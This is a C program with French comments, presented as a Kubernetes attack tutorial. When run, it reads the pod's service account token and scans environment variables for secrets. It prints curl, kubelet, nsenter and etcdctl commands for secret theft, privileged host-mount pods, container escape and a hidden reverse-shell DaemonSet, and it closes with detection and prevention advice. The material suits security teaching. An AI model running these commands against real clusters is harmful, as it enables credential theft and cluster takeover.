/*
 * OBJECTIF  : Comprendre les attaques Kubernetes
 * PREREQUIS : Bases C, Kubernetes basics, RBAC, service accounts
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques d'attaque Kubernetes :
 * service account abuse, vol de secrets, lateral movement entre
 * pods, exploitation du kubelet, et escalade de privileges.
 * Demonstration pedagogique - pas d'exploitation reelle.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>

/*
 * Etape 1 : Matrice d'attaque Kubernetes
 */
static void explain_attack_matrix(void) {
    printf("[*] Etape 1 : Matrice d'attaque Kubernetes\n\n");

    printf("    ┌──────────────────────────────────────────────────┐\n");
    printf("    │            ATTAQUE KUBERNETES                     │\n");
    printf("    ├──────────┬───────────────────────────────────────┤\n");
    printf("    │ Initial  │ Vuln app, exposed dashboard, SSRF    │\n");
    printf("    │ Access   │ Leaked kubeconfig, public API        │\n");
    printf("    ├──────────┼───────────────────────────────────────┤\n");
    printf("    │ Exec     │ Pod exec, reverse shell, sidecar     │\n");
    printf("    ├──────────┼───────────────────────────────────────┤\n");
    printf("    │ Persist  │ DaemonSet, CronJob, mutating webhook │\n");
    printf("    ├──────────┼───────────────────────────────────────┤\n");
    printf("    │ PrivEsc  │ Privileged pod, hostPID, hostNetwork │\n");
    printf("    ├──────────┼───────────────────────────────────────┤\n");
    printf("    │ Lateral  │ Service account tokens, pod-to-pod   │\n");
    printf("    ├──────────┼───────────────────────────────────────┤\n");
    printf("    │ Exfil    │ Secrets, configmaps, etcd dump       │\n");
    printf("    └──────────┴───────────────────────────────────────┘\n\n");
}

/*
 * Etape 2 : Vol de Service Account Token
 */
static void demo_token_theft(void) {
    printf("[*] Etape 2 : Vol de Service Account Token\n\n");

    const char *sa_dir = "/var/run/secrets/kubernetes.io/serviceaccount";
    struct stat st;

    if (stat(sa_dir, &st) == 0) {
        printf("    [+] Repertoire ServiceAccount trouve\n\n");

        /* Lire le token */
        char path[256];
        snprintf(path, sizeof(path), "%s/token", sa_dir);
        FILE *fp = fopen(path, "r");
        if (fp) {
            char token[2048] = {0};
            size_t n = fread(token, 1, sizeof(token) - 1, fp);
            fclose(fp);
            printf("    Token JWT (%zu octets) :\n", n);
            printf("    %.60s...\n\n", token);

            /* Decoder le header JWT (base64) */
            printf("    Structure JWT :\n");
            printf("    <header>.<payload>.<signature>\n");
            printf("    Le payload contient le namespace, le SA name, etc.\n\n");
        }

        /* Lire le namespace */
        snprintf(path, sizeof(path), "%s/namespace", sa_dir);
        fp = fopen(path, "r");
        if (fp) {
            char ns[64] = {0};
            if (fgets(ns, sizeof(ns), fp))
                printf("    Namespace : %s\n", ns);
            fclose(fp);
        }

        /* Verifier le CA */
        snprintf(path, sizeof(path), "%s/ca.crt", sa_dir);
        if (access(path, R_OK) == 0)
            printf("    CA certificate : present\n\n");
    } else {
        printf("    [-] Pas de ServiceAccount monte (pas dans K8s)\n\n");
    }

    printf("    Utilisation du token vole :\n");
    printf("    curl -sk https://$API_SERVER/api/v1/namespaces \\\n");
    printf("      -H \"Authorization: Bearer $TOKEN\"\n\n");
}

/*
 * Etape 3 : Enumeration des secrets
 */
static void explain_secret_enumeration(void) {
    printf("[*] Etape 3 : Enumeration et vol de secrets\n\n");

    printf("    Types de secrets Kubernetes :\n");
    printf("    - Opaque              : donnees generiques (passwords, keys)\n");
    printf("    - kubernetes.io/tls   : certificats TLS\n");
    printf("    - kubernetes.io/sa    : tokens de service account\n");
    printf("    - docker-registry     : credentials de registre\n\n");

    printf("    Lister les secrets (si autorise par RBAC) :\n");
    printf("    curl -sk https://$API/api/v1/namespaces/default/secrets \\\n");
    printf("      -H \"Authorization: Bearer $TOKEN\"\n\n");

    printf("    Les secrets sont en base64, PAS chiffres :\n");
    printf("    echo '<base64_value>' | base64 -d\n\n");

    printf("    Chercher des secrets dans les sources :\n");
    printf("    1. Variables d'environnement des pods\n");
    printf("    2. Volumes montes dans /etc/secrets/\n");
    printf("    3. ConfigMaps avec des credentials\n");
    printf("    4. etcd si accessible (port 2379)\n\n");

    /* Scanner les variables d'environnement pour des secrets */
    printf("    Scan des variables d'environnement sensibles :\n");
    FILE *fp = fopen("/proc/self/environ", "r");
    if (fp) {
        char buf[8192] = {0};
        size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
        fclose(fp);

        char *ptr = buf;
        int found = 0;
        while (ptr < buf + n) {
            size_t len = strlen(ptr);
            if (len == 0) { ptr++; continue; }
            /* Chercher des patterns de credentials */
            if (strstr(ptr, "PASSWORD") || strstr(ptr, "SECRET") ||
                strstr(ptr, "TOKEN") || strstr(ptr, "API_KEY") ||
                strstr(ptr, "CREDENTIAL") || strstr(ptr, "DB_")) {
                printf("      [!] %s\n", ptr);
                found++;
            }
            ptr += len + 1;
        }
        if (found == 0)
            printf("      (aucune variable sensible trouvee)\n");
    }
    printf("\n");
}

/*
 * Etape 4 : Lateral movement via pods
 */
static void explain_lateral_movement(void) {
    printf("[*] Etape 4 : Mouvement lateral dans Kubernetes\n\n");

    printf("    Technique 1 : Pod exec (si permission pods/exec)\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    kubectl exec -it <pod-name> -- /bin/bash\n");
    printf("    OU via API :\n");
    printf("    curl -sk https://$API/api/v1/namespaces/default/pods/<pod>/exec \\\n");
    printf("      -H \"Authorization: Bearer $TOKEN\" \\\n");
    printf("      -d 'command=id&stdin=true&stdout=true&tty=true'\n\n");

    printf("    Technique 2 : Creer un pod malveillant\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    curl -sk -X POST https://$API/api/v1/namespaces/default/pods \\\n");
    printf("      -H \"Authorization: Bearer $TOKEN\" \\\n");
    printf("      -H 'Content-Type: application/json' \\\n");
    printf("      -d '{\n");
    printf("        \"apiVersion\": \"v1\",\n");
    printf("        \"kind\": \"Pod\",\n");
    printf("        \"metadata\": {\"name\": \"evil-pod\"},\n");
    printf("        \"spec\": {\n");
    printf("          \"containers\": [{\n");
    printf("            \"name\": \"evil\",\n");
    printf("            \"image\": \"alpine\",\n");
    printf("            \"command\": [\"/bin/sh\",\"-c\",\"sleep 3600\"],\n");
    printf("            \"volumeMounts\": [{\"name\":\"host\",\"mountPath\":\"/host\"}]\n");
    printf("          }],\n");
    printf("          \"volumes\": [{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]\n");
    printf("        }}'\n\n");

    printf("    Technique 3 : Exploiter le kubelet directement\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    curl -sk https://<node-ip>:10250/pods\n");
    printf("    curl -sk https://<node-ip>:10250/run/<ns>/<pod>/<container> \\\n");
    printf("      -d 'cmd=id'\n\n");
}

/*
 * Etape 5 : Escalade de privileges
 */
static void explain_privesc(void) {
    printf("[*] Etape 5 : Escalade de privileges Kubernetes\n\n");

    printf("    Methode 1 : Pod privileged -> escape container\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    Si on peut creer un pod privileged :\n");
    printf("    spec.containers[0].securityContext.privileged: true\n");
    printf("    -> Mount disque hote, nsenter, chroot\n\n");

    printf("    Methode 2 : hostPID + hostNetwork\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    spec.hostPID: true     -> voir tous les processus hote\n");
    printf("    spec.hostNetwork: true -> reseau de l'hote\n");
    printf("    -> nsenter --target 1 --all -- /bin/bash\n\n");

    printf("    Methode 3 : Voler un token de service account plus privilege\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    1. Lister tous les secrets\n");
    printf("    2. Trouver un token avec plus de permissions\n");
    printf("    3. Utiliser ce token pour des actions elevees\n\n");

    printf("    Methode 4 : Exploiter etcd\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    etcdctl get / --prefix --keys-only\n");
    printf("    etcdctl get /registry/secrets/default/<secret-name>\n");
    printf("    -> Tous les secrets du cluster en clair\n\n");
}

/*
 * Etape 6 : Persistence
 */
static void explain_persistence(void) {
    printf("[*] Etape 6 : Persistence dans Kubernetes\n\n");

    printf("    Technique         | Description\n");
    printf("    ──────────────────|──────────────────────────────────\n");
    printf("    DaemonSet         | Pod sur CHAQUE node automatiquement\n");
    printf("    CronJob           | Execution periodique (beacon)\n");
    printf("    Mutating Webhook  | Injecte du code dans chaque nouveau pod\n");
    printf("    Image backdoor    | Image modifiee dans le registry\n");
    printf("    Sidecar inject    | Container supplementaire dans les pods\n");
    printf("    SA token steal    | Sauvegarder des tokens longue duree\n\n");

    printf("    Exemple DaemonSet persistant :\n");
    printf("    apiVersion: apps/v1\n");
    printf("    kind: DaemonSet\n");
    printf("    metadata:\n");
    printf("      name: kube-monitor  # nom discret\n");
    printf("    spec:\n");
    printf("      template:\n");
    printf("        spec:\n");
    printf("          hostPID: true\n");
    printf("          containers:\n");
    printf("          - name: monitor\n");
    printf("            image: alpine\n");
    printf("            command: [\"reverse_shell.sh\"]\n\n");
}

/*
 * Etape 7 : Detection et prevention
 */
static void explain_detection(void) {
    printf("[*] Etape 7 : Detection et prevention\n\n");

    printf("    Detection :\n");
    printf("    - Audit logs K8s      : surveiller les appels API suspects\n");
    printf("    - Falco               : detection runtime d'anomalies\n");
    printf("    - Tetragon            : observabilite eBPF\n");
    printf("    - Admission controllers: bloquer les pods dangereux\n\n");

    printf("    Prevention :\n");
    printf("    - RBAC minimal        : pas de wildcard (*)\n");
    printf("    - Pod Security Standards : restricted mode\n");
    printf("    - Network Policies    : zero-trust entre namespaces\n");
    printf("    - Secrets encryption  : chiffrer etcd\n");
    printf("    - automountServiceAccountToken: false\n");
    printf("    - Rotation des tokens service account\n\n");
}

int main(void) {
    printf("[*] Demo : Kubernetes Attacks\n\n");

    explain_attack_matrix();
    demo_token_theft();
    explain_secret_enumeration();
    explain_lateral_movement();
    explain_privesc();
    explain_persistence();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
